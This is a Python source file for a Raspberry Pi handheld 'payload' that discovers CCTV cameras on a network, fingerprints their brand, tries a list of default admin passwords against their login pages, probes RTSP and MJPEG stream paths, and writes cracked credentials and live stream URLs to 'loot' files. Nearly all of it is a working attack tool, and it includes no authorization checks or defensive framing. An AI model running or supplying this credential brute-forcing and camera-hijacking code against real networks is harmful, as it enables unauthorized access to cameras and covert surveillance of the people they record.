#!/usr/bin/env python3
"""
RaspyJack Payload -- CCTV Camera Scanner
==========================================
Author: 7h30th3r0n3

8-stage CCTV camera discovery pipeline (Evil-M5Project port):
  1. Port scan targets for camera ports (80, 443, 554, 8080-8099, etc.)
  2. HTTP heuristics: detect camera web interfaces
  3. Brand fingerprint: Hikvision, Dahua, Axis, CP Plus, generic
  4. Login discovery: common admin paths
  5. Default credentials brute-force on 401/403
  6. Stream detection: RTSP DESCRIBE + MJPEG endpoint probing
  7. Save loot: full report, credentials, live stream URLs
  8. LCD dashboard: hosts scanned, cameras found, streams, creds

Target modes: LAN (ARP scan), Single IP, IP list file.

Setup / Prerequisites
---------------------
- Root privileges for ARP scan.
- ``requests`` Python package recommended.

Controls
--------
  OK          -- Start scan
  UP / DOWN   -- Scroll results
  KEY1        -- Toggle mode (LAN / Single / File)
  KEY2        -- Export loot
  KEY3        -- Exit
"""

import os
import sys
import time
import re
import socket
import subprocess
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/CCTV"
CONFIG_DIR = "/root/Raspyjack/config/cctv_scanner"
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)

CAMERA_PORTS = [80, 443, 554, 8080, 8081, 8082, 8083, 8088, 8090,
                8443, 8554, 3702]
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "password"),
    ("root", "root"), ("admin", ""), ("admin", "888888"),
    ("admin", "666666"), ("admin", "1234"), ("root", "pass"),
]
RTSP_PATHS = [
    "/Streaming/Channels/1", "/live", "/cam/realmonitor",
    "/h264", "/live/ch00_0", "/ch0_0.264",
]
MJPEG_PATHS = [
    "/mjpg/video.mjpg", "/axis-cgi/mjpg/video.cgi",
    "/cgi-bin/snapshot.cgi", "/video.mjpg", "/snap.jpg",
]
BRAND_SIGS = {
    "Hikvision": ["/ISAPI/", "hikvision", "DNVRS-Webs"],
    "Dahua":     ["/cgi-bin/magicBox.cgi", "dahua", "DH_"],
    "Axis":      ["/axis-cgi/", "AXIS"],
    "CPPlus":    ["/cgi-bin/snapshot.cgi", "cpplus", "CP-"],
}
LOGIN_PATHS = ["/", "/login", "/admin", "/cgi-bin/", "/login.htm"]
MODES = ["LAN", "Single", "File"]
IP_LIST_PATH = os.path.join(CONFIG_DIR, "targets.txt")
DEBOUNCE = 0.22

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "mode_idx": 0,
    "single_ip": "",
    "cameras": [],        # list of camera dicts
    "stats": {"scanned": 0, "cameras": 0, "streams": 0, "creds": 0},
    "status": "Idle",
    "scanning": False,
    "stop": False,
    "scroll": 0,
}


def _get(key):
    with _lock:
        val = _state[key]
        if isinstance(val, (list, dict)):
            return list(val) if isinstance(val, list) else dict(val)
        return val


def _set(**kw):
    with _lock:
        for k, v in kw.items():
            _state[k] = v


def _add_camera(cam):
    with _lock:
        _state["cameras"] = list(_state["cameras"]) + [cam]


def _update_stats(**kw):
    with _lock:
        stats = dict(_state["stats"])
        for k, v in kw.items():
            stats[k] = v
        _state["stats"] = stats


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------
def _http_get(url, timeout=5, auth=None):
    """Simple HTTP GET. Returns (status_code, headers_dict, body_text)."""
    try:
        import requests
        kw = {"timeout": timeout, "verify": False, "allow_redirects": True}
        if auth:
            kw["auth"] = auth
        resp = requests.get(url, **kw)
        hdrs = dict(resp.headers)
        return resp.status_code, hdrs, resp.text[:2000]
    except ImportError:
        return _http_get_socket(url, timeout, auth)
    except Exception:
        return 0, {}, ""


def _http_get_socket(url, timeout=5, auth=None):
    """Fallback HTTP GET via socket."""
    import base64 as b64
    m = re.match(r"https?://([^/:]+)(?::(\d+))?(/.*)$", url)
    if not m:
        return 0, {}, ""
    host = m.group(1)
    port = int(m.group(2)) if m.group(2) else 80
    path = m.group(3) or "/"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        auth_hdr = ""
        if auth:
            cred = b64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            auth_hdr = f"Authorization: Basic {cred}\r\n"
        req = (f"GET {path} HTTP/1.0\r\nHost: {host}\r\n"
               f"{auth_hdr}Connection: close\r\n\r\n")
        s.sendall(req.encode())
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 8192:
                break
        text = data.decode("utf-8", errors="replace")
        m_status = re.match(r"HTTP/\S+\s+(\d+)", text)
        code = int(m_status.group(1)) if m_status else 0
        return code, {}, text[:2000]
    except Exception:
        return 0, {}, ""
    finally:
        s.close()


def _tcp_open(ip, port, timeout=1.0):
    """Check if TCP port is open."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        s.close()


def _rtsp_describe(ip, port, path, timeout=3):
    """Send RTSP DESCRIBE and return True if stream exists."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        uri = f"rtsp://{ip}:{port}{path}"
        req = (f"DESCRIBE {uri} RTSP/1.0\r\n"
               f"CSeq: 1\r\nAccept: application/sdp\r\n\r\n")
        s.sendall(req.encode())
        resp = s.recv(1024).decode("utf-8", errors="replace")
        return "200 OK" in resp
    except Exception:
        return False
    finally:
        s.close()


def _arp_hosts():
    """Get list of IPs from ARP table."""
    hosts = []
    try:
        out = subprocess.run(
            ["arp", "-an"], capture_output=True, text=True, timeout=5,
        )
        for line in out.stdout.splitlines():
            m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)", line)
            if m:
                ip = m.group(1)
                if not ip.endswith(".255") and not ip.endswith(".0"):
                    hosts.append(ip)
    except Exception:
        pass
    return hosts


# ---------------------------------------------------------------------------
# Scan pipeline
# ---------------------------------------------------------------------------
def _scan_host(ip):
    """Run the 8-stage pipeline on a single host."""
    cam = {
        "ip": ip, "brand": "Unknown", "open_ports": [],
        "login_url": "", "creds": None, "streams": [],
        "mjpeg_urls": [],
    }

    # Stage 1: Port scan
    for port in CAMERA_PORTS:
        if _get("stop"):
            return None
        if _tcp_open(ip, port, timeout=0.8):
            cam["open_ports"].append(port)

    if not cam["open_ports"]:
        return None

    web_port = None
    for p in [80, 8080, 8081, 8088, 443, 8443]:
        if p in cam["open_ports"]:
            web_port = p
            break

    # Stage 2 & 3: HTTP heuristics + brand fingerprint
    if web_port:
        scheme = "https" if web_port in (443, 8443) else "http"
        base_url = f"{scheme}://{ip}:{web_port}"

        code, hdrs, body = _http_get(base_url, timeout=4)
        if code > 0:
            combined = (body + str(hdrs)).lower()
            for brand, sigs in BRAND_SIGS.items():
                for sig in sigs:
                    if sig.lower() in combined:
                        cam["brand"] = brand
                        break

            # Stage 4: Login discovery
            for lpath in LOGIN_PATHS:
                if _get("stop"):
                    return None
                lcode, _, _ = _http_get(f"{base_url}{lpath}", timeout=3)
                if lcode in (200, 401, 403):
                    cam["login_url"] = f"{base_url}{lpath}"
                    break

            # Stage 5: Default credentials
            if cam["login_url"] and code in (401, 403):
                for user, passwd in DEFAULT_CREDS:
                    if _get("stop"):
                        return None
                    ccode, _, _ = _http_get(
                        cam["login_url"], timeout=3, auth=(user, passwd))
                    if ccode == 200:
                        cam["creds"] = (user, passwd)
                        break

        # Stage 6a: MJPEG detection
        for mjpath in MJPEG_PATHS:
            if _get("stop"):
                return None
            mcode, mhdrs, _ = _http_get(
                f"{base_url}{mjpath}", timeout=3,
                auth=cam["creds"] if cam["creds"] else None)
            if mcode == 200:
                content_type = str(mhdrs.get("Content-Type", ""))
                if ("image" in content_type or "multipart" in content_type
                        or "jpeg" in content_type):
                    cam["mjpeg_urls"].append(f"{base_url}{mjpath}")

    # Stage 6b: RTSP detection
    rtsp_port = 554 if 554 in cam["open_ports"] else (
        8554 if 8554 in cam["open_ports"] else None)
    if rtsp_port:
        for rpath in RTSP_PATHS:
            if _get("stop"):
                return None
            if _rtsp_describe(ip, rtsp_port, rpath):
                cam["streams"].append(f"rtsp://{ip}:{rtsp_port}{rpath}")

    return cam


def _do_scan():
    """Full scan orchestration."""
    _set(scanning=True, stop=False, cameras=[],
         stats={"scanned": 0, "cameras": 0, "streams": 0, "creds": 0},
         status="Starting scan...")

    mode = MODES[_get("mode_idx")]

    if mode == "LAN":
        targets = _arp_hosts()
        _set(status=f"LAN: {len(targets)} hosts")
    elif mode == "Single":
        ip = _get("single_ip") or "192.168.1.1"
        targets = [ip]
    else:
        targets = _load_ip_list()
        _set(status=f"File: {len(targets)} IPs")

    total = len(targets)
    creds_count = 0
    streams_count = 0
    cam_count = 0

    for idx, ip in enumerate(targets):
        if _get("stop"):
            break
        _set(status=f"Scan {idx + 1}/{total}: {ip}")
        _update_stats(scanned=idx + 1)

        cam = _scan_host(ip)
        if cam:
            _add_camera(cam)
            cam_count += 1
            streams_count += len(cam["streams"]) + len(cam["mjpeg_urls"])
            if cam["creds"]:
                creds_count += 1
            _update_stats(cameras=cam_count, streams=streams_count,
                          creds=creds_count)

    # Stage 7: Save loot
    _save_loot()
    _set(scanning=False,
         status=f"Done: {cam_count} cams, {streams_count} streams")


def _load_ip_list():
    """Load target IPs from file."""
    if not os.path.isfile(IP_LIST_PATH):
        return []
    try:
        with open(IP_LIST_PATH, "r") as f:
            return [line.strip() for line in f
                    if line.strip() and not line.startswith("#")]
    except Exception:
        return []


def _save_loot():
    """Write loot files."""
    cameras = _get("cameras")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Full report
    lines = [f"CCTV Scan Report - {ts}", "=" * 50]
    for cam in cameras:
        lines.append(f"\nIP: {cam['ip']}")
        lines.append(f"Brand: {cam['brand']}")
        lines.append(f"Ports: {cam['open_ports']}")
        lines.append(f"Login: {cam['login_url']}")
        if cam["creds"]:
            lines.append(f"Creds: {cam['creds'][0]}:{cam['creds'][1]}")
        for s in cam["streams"]:
            lines.append(f"RTSP: {s}")
        for m in cam["mjpeg_urls"]:
            lines.append(f"MJPEG: {m}")

    path_report = os.path.join(LOOT_DIR, f"cctv_scan_{ts}.txt")
    with open(path_report, "w") as f:
        f.write("\n".join(lines))

    # Credentials file
    cred_lines = []
    for cam in cameras:
        if cam["creds"]:
            cred_lines.append(
                f"{cam['ip']} | {cam['brand']} | "
                f"{cam['creds'][0]}:{cam['creds'][1]}")
    if cred_lines:
        path_creds = os.path.join(LOOT_DIR, f"cctv_credentials_{ts}.txt")
        with open(path_creds, "w") as f:
            f.write("\n".join(cred_lines))

    # Live streams (Name | URL)
    live_lines = []
    for cam in cameras:
        for s in cam["streams"]:
            live_lines.append(f"{cam['brand']}_{cam['ip']} | {s}")
        for m in cam["mjpeg_urls"]:
            live_lines.append(f"{cam['brand']}_{cam['ip']} | {m}")
    if live_lines:
        path_live = os.path.join(LOOT_DIR, "cctv_live.txt")
        with open(path_live, "w") as f:
            f.write("\n".join(live_lines))


def _start_scan():
    if _get("scanning"):
        return
    threading.Thread(target=_do_scan, daemon=True).start()


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    scroll = _get("scroll")
    status = _get("status")
    scanning = _get("scanning")
    stats = _get("stats")
    mode = MODES[_get("mode_idx")]
    cameras = _get("cameras")

    # Header
    d.rectangle((0, 0, 127, 12), fill="#111")
    d.text((2, 1), f"CCTV [{mode}]", font=font, fill="#FF0066")
    d.ellipse((118, 3, 124, 9), fill="#00FF00" if scanning else "#666")

    y = 14
    # Stats
    d.text((2, y), f"Hosts:{stats['scanned']} Cams:{stats['cameras']}", font=font, fill="#AAAAAA")
    y += 11
    d.text((2, y), f"Streams:{stats['streams']} Creds:{stats['creds']}", font=font, fill="#AAAAAA")
    y += 13

    # Camera list
    if not cameras:
        d.text((4, y + 10), "No cameras found", font=font, fill="#666")
        d.text((4, y + 24), "OK=Start scan", font=font, fill="#666")
    else:
        visible = 4
        for i in range(scroll, min(scroll + visible, len(cameras))):
            cam = cameras[i]
            sel = (i == scroll)
            fg = "#00FF00" if sel else "#AAAAAA"
            brand_short = cam["brand"][:6]
            stream_cnt = len(cam["streams"]) + len(cam["mjpeg_urls"])
            cred_mark = "*" if cam["creds"] else ""
            line1 = f"{cam['ip']} {brand_short}{cred_mark}"
            line2 = f" P:{len(cam['open_ports'])} S:{stream_cnt}"
            d.text((2, y), line1[:21], font=font, fill=fg)
            y += 10
            d.text((2, y), line2[:21], font=font, fill="#888")
            y += 12

    # Status
    d.rectangle((0, 106, 127, 115), fill="#0a0a0a")
    d.text((2, 107), status[:21], font=font, fill="#FFCC00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK K1:mode K2:exp K3x", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


def _show_msg(line1, line2=""):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), line1[:21], font=font, fill="#00FF00")
    if line2:
        d.text((4, 65), line2[:21], font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.2)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "CCTV SCANNER", font=font, fill="#FF0066")
    d.text((4, 32), "Camera discovery", font=font, fill="#888")
    d.text((4, 52), "OK=Scan  K1=Mode", font=font, fill="#666")
    d.text((4, 64), "U/D=Scroll K2=Export", font=font, fill="#666")
    d.text((4, 76), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    last_press = 0.0

    try:
        while True:
            btn = get_button(PINS, GPIO)
            now = time.time()
            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if btn == "KEY3":
                _set(stop=True)
                break

            elif btn == "OK":
                _start_scan()

            elif btn == "KEY1":
                idx = _get("mode_idx")
                _set(mode_idx=(idx + 1) % len(MODES))

            elif btn == "KEY2":
                cameras = _get("cameras")
                if cameras:
                    _save_loot()
                    _show_msg("Loot saved!", LOOT_DIR[-20:])
                else:
                    _show_msg("No data yet")

            elif btn == "UP":
                s = _get("scroll")
                _set(scroll=max(0, s - 1))

            elif btn == "DOWN":
                s = _get("scroll")
                cameras = _get("cameras")
                _set(scroll=min(max(0, len(cameras) - 1), s + 1))

            _draw_lcd()
            time.sleep(0.05)

    finally:
        _set(stop=True)
        time.sleep(0.2)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
